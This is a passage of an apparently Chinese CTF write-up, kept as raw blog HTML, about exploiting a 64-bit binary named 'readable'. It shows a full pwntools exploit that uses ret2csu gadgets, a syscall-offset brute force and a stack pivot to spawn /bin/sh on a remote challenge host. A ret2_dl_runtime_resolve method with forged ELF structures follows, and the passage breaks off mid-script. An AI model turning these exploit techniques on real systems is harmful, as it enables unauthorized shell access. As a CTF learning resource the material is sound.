class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary = <span class="string">'./readable'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x600910</span></span><br><span class="line">buff_addr = bss_addr + <span class="number">0x20</span></span><br><span class="line">main_addr = <span class="number">0x400505</span></span><br><span class="line">head_addr = <span class="number">0x400000</span></span><br><span class="line">set_args_addr = <span class="number">0x40058A</span>	<span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">call_func_addr = <span class="number">0x400570</span>	<span class="comment">#__libc_csu_init中的通用gadget</span></span><br><span class="line">read_got = <span class="number">0x6008E8</span></span><br><span class="line">leave_ret = <span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'52.68.53.28'</span>,<span class="number">56746</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./readable'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./readable','bp 0x400579')	# get_syscall_dis()</span></span><br><span class="line">        io = gdb.debug(<span class="string">'./readable'</span>,<span class="string">'''bp 0x4004FD</span></span><br><span class="line"><span class="string">                                       bp 0x40051B'''</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_syscall_addr</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(set_args_addr)</span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x0</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0,rsi = r14 = read_got,rdx = r13 = 0x01,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># read(0,read_got,1)  rax存储返回值，read()成功,则返回读取的字节数,这将rax设置为了0x01</span></span><br><span class="line">    shellcode += p64(call_func_addr)	</span><br><span class="line">    shellcode += <span class="string">'A'</span> * <span class="number">8</span>	<span class="comment"># 0x400586  add rsp, 8</span></span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x04</span>) + p64(head_addr) + p64(<span class="number">0x01</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0x01,rsi = r14 = head_addr,rdx = r13 = 0x04,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># write(1,head_addr,4),若dis成功将read_got指向syscall，则执行write()</span></span><br><span class="line">    shellcode += p64(call_func_addr)	</span><br><span class="line">    length = len(shellcode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"shellcode length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = shellcode.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload length:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># buf,rbp,ret_address</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># buf,rbp,ret_address</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr))</span><br><span class="line">    io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x08</span>) + p64(leave_ret))</span><br><span class="line">    <span class="comment"># raw_input('before send dis')</span></span><br><span class="line">    io.send(chr(dis))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"dis:"</span>,hex(dis)</span><br><span class="line">    <span class="comment"># raw_input('before receive data')</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = io.recv(<span class="number">4</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">'\x7FELF'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[*]Find the offset of syscall in read() function :"</span>,hex(dis)</span><br><span class="line">            raw_input()</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_syscall_dis</span><span class="params">()</span>:</span></span><br><span class="line">    dis = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> dis <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"-------------------Start-----------------------"</span></span><br><span class="line">            brute_syscall_addr(io,dis)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"--------------------End------------------------\n"</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(set_args_addr)</span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x3b</span>) + p64(read_got - <span class="number">0x3b</span> + <span class="number">1</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0,rsi = r14 = (read_got-0x3a),rdx = r13 = 0x3b,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># read(0,read_got-0x3a,3b)  rax存储返回值，read()成功,则返回读取的字节数,这将rax设置为了0x3b</span></span><br><span class="line">    shellcode += p64(call_func_addr)	</span><br><span class="line">    shellcode += <span class="string">'A'</span> * <span class="number">8</span>	<span class="comment"># 0x400586  add rsp, 8</span></span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>) + p64(bss_addr)</span><br><span class="line">    <span class="comment"># rdi = r15 = bss_addr("/bin/sh"),rsi = r14 = 0,rdx = r13 = 0,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># execvl("/bin/sh",0,0)</span></span><br><span class="line">    shellcode += p64(call_func_addr)	</span><br><span class="line">    length = len(shellcode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"shellcode length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = shellcode.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload length:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 'A'*0x10---RBP---ret_addr  buffer的地址使用RBP-0x10算出，shellcode从0x600930(bss_addr+0x20)开始存储</span></span><br><span class="line">        <span class="comment"># raw_input('---------[%d] Adjust buffer address---------'%i)</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># raw_input('-------------[%d] Send payload-------------'%i)</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr)) <span class="comment">#bss节前0x20字节用于调整buffer地址</span></span><br><span class="line">    padding = <span class="string">"/bin/sh"</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="comment"># raw_input('-------------Send "/bin/sh"-------------')</span></span><br><span class="line">    io.send(padding + p64(buff_addr - <span class="number">0x08</span>) + p64(leave_ret))	<span class="comment">#发送"/bin/sh",设置rsp指向shellcode,并跳转到shellcode执行</span></span><br><span class="line">    io.send(<span class="string">'A'</span>*(<span class="number">0x3b</span><span class="number">-1</span>) + chr(dis))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_syscall_dis()</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    dis = <span class="number">0x1e</span> <span class="comment"># or 0x3b</span></span><br><span class="line">    pwn(io,dis)</span><br></pre></td></tr></table></figure></p>
<h4 id="4、方法二：使用ret2-dl-runtime-resolve方式进行利用"><a href="#4、方法二：使用ret2-dl-runtime-resolve方式进行利用" class="headerlink" title="4、方法二：使用ret2_dl_runtime_resolve方式进行利用"></a>4、方法二：使用ret2_dl_runtime_resolve方式进行利用</h4><p><strong><code>利用思路：</code></strong></p>
<ul>
<li>1、构造<strong><code>fake_reloc_data</code></strong>、<strong><code>fake_sym_data</code></strong>、<strong><code>func_name</code></strong>、<strong><code>binsh_str</code></strong>、<strong><code>shellcode</code></strong>数据，并写入到合适的位置。计算<code>数据写入地址</code>时，需要注意一些情况。一般情况，这些数据都会写入到<code>.bss节之后</code>的位置。<code>x64情况</code>下，在<strong><code>_dl_runtime_resolve()</code></strong>函数和<strong><code>_dl_fixup()</code></strong>函数中，程序会通过<code>rsp</code>保存<code>寄存器数据</code>到栈上和修改<code>栈上的数据</code>，并且<code>范围较大</code>。由于此程序在通过<code>read()函数</code>多次读入数据时，修改了<code>rbp</code>，使得<code>rbp</code>和<code>rsp</code>都指向<code>.bss节之后的地址</code>。我们在进入<strong><code>符号解析函数</code></strong>时，解析函数会<code>减小rsp</code>，用于<code>存储寄存器数据</code>，并且会将<code>栈上的一些数据清零</code>。这会导致<code>.bss节之前节</code>的数据<code>被修改</code>，造成<code>无法解析</code>system函数的地址。所以我们需要在<code>shellcode写入地址前</code>留够一定的空间，供<code>符号解析函数</code>使用。而<code>fake_reloc_data</code>、<code>fake_sym_data</code>、<code>func_name</code>、<code>binsh_str</code>等数据一般写在<code>shellcode之后</code>的位置。</li>
</ul>
<p>&emsp;&emsp;下面是<strong><code>_dl_runtime_resolve()</code></strong>函数和<strong><code>_dl_fixup()</code></strong>函数中<code>对rsp和rbp修改</code>，以及<code>利用rsp和rbp</code>修改<code>栈上数据</code>的代码片段：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve():</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F14 <span class="keyword">and</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFFC0h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F18 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="built_in">cs</span>:qword_7F3989066D50(<span class="number">0x3C0</span>)</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F1F <span class="keyword">mov</span>     [<span class="built_in">rsp</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F23 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">8</span>], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F28 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">10h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F2D <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">18h</span>], <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F32 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">20h</span>], <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F37 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>], <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F3C <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">30h</span>], <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F41 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0EEh</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F46 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F48 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">250h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F50 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">258h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F58 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">260h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F60 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">268h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F68 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">270h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F70 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">278h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F78 xsavec  <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">40h</span>]</span><br><span class="line"></span><br><span class="line">_dl_fixup():</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E50A3A <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E50C10 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">78h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E51203 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">38h</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>2、将<code>fake数据</code>写入到<code>指定地址</code>后，还需要修改<code>.dynamic节</code>中<code>DT_VERSYM动态节类型</code>所对应的<code>动态节表项</code>中的<code>vernum表的地址</code>，使得<code>ndx = vernum + sym_index*2</code>地址处的<code>ndx值</code>为合理值。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modify versym dynamic addr(.gnu.version) </span></span><br><span class="line"><span class="comment"># DT_VERSYM(0x40031E) - sym_index(0x155E2)*2 = 0x3D575A or 0x6006F0 - sym_index(0x155E2)*2 = 0x5D5B2C</span></span><br><span class="line"><span class="comment"># raw_input('---------[1] Before modify versym dynamic address---------')</span></span><br><span class="line">write_data_to_address(<span class="number">0x600858</span>,p64(<span class="number">0x6FFFFFF0</span>) + p64(<span class="number">0x3D575A</span>)) <span class="comment"># versym + sym_index*2 可被访问</span></span><br></pre></td></tr></table></figure>
<ul>
<li>3、构造<code>shellcode</code>，首先将<code>“/bin/sh”的地址</code>存入<code>rdi寄存器</code>，然后返回到<code>PLT0</code>处的代码，传入<code>system重定位项</code>在<code>重定位表</code>中的<code>下标</code>，利用<code>符号解析函数</code>，计算<code>system函数的地址</code>。解析完system函数的地址后，就会调用<strong><code>system(&quot;/bin/sh&quot;)</code></strong>。从而获取shell。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p64(p_rdi_ret) + p64(binsh_str_addr)	<span class="comment"># "/bin/sh"</span></span><br><span class="line">shellcode += p64(PLT0) + p64(reloc_index)</span><br><span class="line">write_data_to_address(buff_addr,shellcode)</span><br></pre></td></tr></table></figure>
<ul>
<li>4、向内存中<code>写入shellcode后</code>，还需要写入一段数据，用于<code>调整rsp</code>，使程序<code>跳转到shellcode</code>执行。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buf--rbp--ret_address</span></span><br><span class="line">io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br></pre></td></tr></table></figure>
<p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="comment"># Elf64_Rel *reloc = JMPREL + reloc_index*3*8</span></span><br><span class="line"><span class="comment"># Elf64_Sym *sym = &amp;SYMTAB[(reloc-&gt;r_info)&gt;&gt;0x20]</span></span><br><span class="line"><span class="comment"># i.e.  *sym = DT_SYMTAB + [(reloc-&gt;r_info)&gt;&gt;0x20]*3*8</span></span><br><span class="line"><span class="comment"># assert(((reloc-&gt;r_info)&amp;0xFFFFFFFF) == 0x7) type</span></span><br><span class="line"><span class="comment"># if((sym-&gt;st_other)&amp;3 == 0) if not resolved</span></span><br><span class="line"><span class="comment"># uint16_t ndx = VERSYM[(reloc-&gt;r_info)&gt;&gt;0x20]</span></span><br><span class="line"><span class="comment"># r_found_version *version = &amp;l-&gt;l_version[ndx]</span></span><br><span class="line"><span class="comment"># name = STRTAB + sym-&gt;st_name</span></span><br><span class="line"><span class="comment"># modify ret_addr = PLT0、the first arg = reloc_index、rdi = addr("/bin/sh")</span></span><br><span class="line"><span class="comment"># modify (jmprel + reloc_index*3*8) &lt;== fake_reloc_data</span></span><br><span class="line"><span class="comment"># modify (symtab + [(reloc-&gt;r_info)&gt;&gt;0x20]*3*8) &lt;== fake_sym_data</span></span><br><span class="line"><span class="comment"># modify (strtab + sym-&gt;st_name) &lt;== 'system\x00'</span></span><br><span class="line"><span class="comment"># modify (link_map + 0x1c8 == 0) or (versym + sym_index*2 可被访问)	#第2点在64位系统中很难满足，第1点需要泄露link_map的值。</span></span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./readable'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'52.68.53.28'</span>,<span class="number">56746</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./readable'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./readable','''bp 0x4004FD</span></span><br><span class="line">        <span class="comment">#                                bp 0x40051B''')</span></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf64_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Xword r_info;  /* 重定位类型和符号表下标 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Sxword r_addend; /* Addend */ 8byte</span></span><br><span class="line"><span class="string">&#125; Elf64_Rela;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x64_reloc_data</span><span class="params">(sym_index,got_plt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p64(got_plt) + p64((sym_index&lt;&lt;<span class="number">0x20</span>) + <span class="number">0x07</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf64_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">    Elf64_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Xword   st_size;  /* 符号的大小 */ 8byte</span></span><br><span class="line"><span class="string">&#125; Elf64_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x64_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0x12</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内存布局：</span></span><br><span class="line"><span class="string">0x600910 - 0x600930 Adjust buffer address</span></span><br><span class="line"><span class="string">0x600930 - 0x600940 system_got</span></span><br><span class="line"><span class="string">0x600940 - 0x600F20 0x5E0</span></span><br><span class="line"><span class="string">0x600F20 - 0x600F40 shellcode</span></span><br><span class="line"><span class="string">0x600F40 - 0x600F88 0x50</span></span><br><span class="line"><span class="string">0x600F88 - 0x600FA8 reloc_data (align 0x18) </span></span><br><span class="line"><span class="string">0x600FA8 - 0x600FB0 0x8</span></span><br><span class="line"><span class="string">0x600FB0 - 0x600FD0 sym_data (align 0x18)</span></span><br><span class="line"><span class="string">0x600FD0 - 0x600FE0 func_name("system")</span></span><br><span class="line"><span class="string">0x600FE0 - 0x600FF0 binsh_str("/bin/sh")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x400360</span>	</span><br><span class="line">DT_SYMTAB = <span 